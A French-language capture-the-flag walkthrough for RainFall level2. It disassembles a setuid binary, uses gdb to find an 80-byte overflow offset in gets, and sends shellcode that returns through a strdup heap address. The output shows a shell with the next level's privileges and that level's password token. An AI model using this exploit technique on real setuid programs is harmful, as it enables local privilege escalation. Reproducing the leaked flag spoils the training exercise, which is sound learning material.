On a un binaire avec le flag setuid
```
level2@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
```
On désassemble
```asm
level2@RainFall:~$ objdump -d intel  ./level2 -M intel
080484d4 <p>:
 80484d4:	55                   	push   ebp
 80484d5:	89 e5                	mov    ebp,esp
 80484d7:	83 ec 68             	sub    esp,0x68
 80484da:	a1 60 98 04 08       	mov    eax,ds:0x8049860
 80484df:	89 04 24             	mov    DWORD PTR [esp],eax
 80484e2:	e8 c9 fe ff ff       	call   80483b0 <fflush@plt>
 80484e7:	8d 45 b4             	lea    eax,[ebp-0x4c]
 80484ea:	89 04 24             	mov    DWORD PTR [esp],eax
 80484ed:	e8 ce fe ff ff       	call   80483c0 <gets@plt>
 80484f2:	8b 45 04             	mov    eax,DWORD PTR [ebp+0x4]
 80484f5:	89 45 f4             	mov    DWORD PTR [ebp-0xc],eax
 80484f8:	8b 45 f4             	mov    eax,DWORD PTR [ebp-0xc]
 80484fb:	25 00 00 00 b0       	and    eax,0xb0000000
 8048500:	3d 00 00 00 b0       	cmp    eax,0xb0000000
 8048505:	75 20                	jne    8048527 <p+0x53>
 8048507:	b8 20 86 04 08       	mov    eax,0x8048620
 804850c:	8b 55 f4             	mov    edx,DWORD PTR [ebp-0xc]
 804850f:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
 8048513:	89 04 24             	mov    DWORD PTR [esp],eax
 8048516:	e8 85 fe ff ff       	call   80483a0 <printf@plt>
 804851b:	c7 04 24 01 00 00 00 	mov    DWORD PTR [esp],0x1
 8048522:	e8 a9 fe ff ff       	call   80483d0 <_exit@plt>
 8048527:	8d 45 b4             	lea    eax,[ebp-0x4c]
 804852a:	89 04 24             	mov    DWORD PTR [esp],eax
 804852d:	e8 be fe ff ff       	call   80483f0 <puts@plt>
 8048532:	8d 45 b4             	lea    eax,[ebp-0x4c]
 8048535:	89 04 24             	mov    DWORD PTR [esp],eax
 8048538:	e8 a3 fe ff ff       	call   80483e0 <strdup@plt>
 804853d:	c9                   	leave  
 804853e:	c3                   	ret    

0804853f <main>:
 804853f:	55                   	push   ebp
 8048540:	89 e5                	mov    ebp,esp
 8048542:	83 e4 f0             	and    esp,0xfffffff0
 8048545:	e8 8a ff ff ff       	call   80484d4 <p>
 804854a:	c9                   	leave  
 804854b:	c3                   	ret    
 804854c:	90                   	nop
 804854d:	90                   	nop
 804854e:	90                   	nop
 804854f:	90                   	nop
```
On remarque l'appel à **fflush**, **gets**, **puts** et **strdup**. La fonction p est intéressante. Elle est appelé par main et utilise la fonction gets dont nous savons qu'elle est vulnérable aux attaques buffer overflow.
Cependant il y a un contrôle:
```asm
 80484f8:	8b 45 f4             	mov    eax,DWORD PTR [ebp-0xc]
 80484fb:	25 00 00 00 b0       	and    eax,0xb0000000
 8048500:	3d 00 00 00 b0       	cmp    eax,0xb0000000
 8048505:	75 20                	jne    8048527 <p+0x53>
```
Il semble vérifier si **eax** contient une adresse appartenant à la plage 0xb0000000 - 0xbfffffff, qui correspond à la plage des adresses du Kernel ou de la Stack.
Étant donné qu'il n'y a pas de fonction cachée avec un appel à **system** comme dans **level1**, nous devrons injecter la nôtre.
Nous allons d'abord essayer de détourner le registre de retour **eax** pour exploiter la vulnérabilité de **gets**. L'adresse de retour sera celle du buffer de **gets**, et le buffer contiendra du **shellcode**.
Nous utilisons la même tactique que pour **level1** afin de déterminer l'offset :
```
level2@RainFall:~$ python /tmp/pattern3.py
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
level2@RainFall:~$ gdb -q ./level2
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x8048542
(gdb) b p
Breakpoint 2 at 0x80484da
(gdb) r
Starting program: /home/user/level2/level2

Breakpoint 1, 0x08048542 in main ()
(gdb) s
Single stepping until exit from function main,
which has no line number information.

Breakpoint 2, 0x080484da in p ()
(gdb) disas main
Dump of assembler code for function main:
   0x0804853f <+0>:     push   %ebp
   0x08048540 <+1>:     mov    %esp,%ebp
   0x08048542 <+3>:     and    $0xfffffff0,%esp
   0x08048545 <+6>:     call   0x80484d4 <p>
   0x0804854a <+11>:    leave
   0x0804854b <+12>:    ret
End of assembler dump.
(gdb) b *0x0804854b
Breakpoint 3 at 0x804854b
(gdb) c
Continuing.
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
(gdb) quit
A debugging session is active.

        Inferior 1 [process 12242] will be killed.

Quit anyway? (y or n) y
level2@RainFall:~$ python /tmp/pattern3.py > /tmp/2.txt
level2@RainFall:~$ python /tmp/pattern3.py /tmp/2.txt 0x37634136
offset found at: 80
```
On a trouvé un offset à 80 octets. Essayons d'injecter le **shelcode** à l'adresse de retour:
```
level2@RainFall:~$ gdb -q ./level2
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x8048542
(gdb) b p
Breakpoint 2 at 0x80484da
(gdb) r
Starting program: /home/user/level2/level2

Breakpoint 1, 0x08048542 in main ()
(gdb) s
Single stepping until exit from function main,
which has no line number information.

Breakpoint 2, 0x080484da in p ()
(gdb) disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:     push   %ebp
   0x080484d5 <+1>:     mov    %esp,%ebp
   0x080484d7 <+3>:     sub    $0x68,%esp
=> 0x080484da <+6>:     mov    0x8049860,%eax
   0x080484df <+11>:    mov    %eax,(%esp)
   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:    mov    %eax,(%esp)
   0x080484ed <+25>:    call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:    mov    0x4(%ebp),%eax
   0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:    mov    -0xc(%ebp),%eax
   0x080484fb <+39>:    and    $0xb0000000,%eax
   0x08048500 <+44>:    cmp    $0xb0000000,%eax
   0x08048505 <+49>:    jne    0x8048527 <p+83>
   0x08048507 <+51>:    mov    $0x8048620,%eax
   0x0804850c <+56>:    mov    -0xc(%ebp),%edx
   0x0804850f <+59>:    mov    %edx,0x4(%esp)
   0x08048513 <+63>:    mov    %eax,(%esp)
   0x08048516 <+66>:    call   0x80483a0 <printf@plt>
   0x0804851b <+71>:    movl   $0x1,(%esp)
   0x08048522 <+78>:    call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:    lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:    mov    %eax,(%esp)
   0x0804852d <+89>:    call   0x80483f0 <puts@plt>
   0x08048532 <+94>:    lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:    mov    %eax,(%esp)
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:   leave
   0x0804853e <+106>:   ret
End of assembler dump.
```
On veut le buffer de retour, donc on met un break point après l'appel a **gets**: 0x080484f2 
```
(gdb) b *0x080484f2
Breakpoint 3 at 0x80484f2
(gdb) s
Single stepping until exit from function p,
which has no line number information.
aaaaaaa

Breakpoint 3, 0x080484f2 in p ()
(gdb) i r
eax            0xbffff6dc       -1073744164
ecx            0xb7fd28c4       -1208145724
edx            0xbffff6dc       -1073744164
ebx            0xb7fd0ff4       -1208152076
esp            0xbffff6c0       0xbffff6c0
ebp            0xbffff728       0xbffff728
esi            0x0      0
edi            0x0      0
eip            0x80484f2        0x80484f2 <p+30>
eflags         0x200282 [ SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
```
in eax the buffer is at address 0xbffff6dc, lets try to inject here.
Our shell code is 21 bytes long, the limit is 80 bytes so we first have our 21 bytes shellcode then 59 random bytes then 4 bytes for the address
```
level2@RainFall:~$ python /tmp/exploit3.py  0xbffff6dc 59
crafting payload...
done:
/tmp/payload_level2
level2@RainFall:~$ cat /tmp/payload_level2 - | ./level2

(0xbffff6dc)

```
Cela a échoué parce que nous ne pouvons pas écrire sur la Stack, mais sur la Heap, cela semble fonctionner. strdup renvoie l'adresse suivante :
```
level2@RainFall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                       = 0
gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5
TEST!
)                                        = 0xbffff6fc
puts("TEST!"
TEST!
)                                        = 6
strdup("TEST!")                          = 0x0804a008
+++ exited (status 8) +++
```
Nous réessayons avec cette adresse allouée par **malloc**:
```
level2@RainFall:~$ python /tmp/exploit3.py  0x0804a008 59
crafting payload...
done:
/tmp/payload_level2
level2@RainFall:~$ cat /tmp/payload_level2 - | ./level2

j
 X�Rh//shh/bin��1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
id
uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) groups=2022(level3),100(users),2021(level2)
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```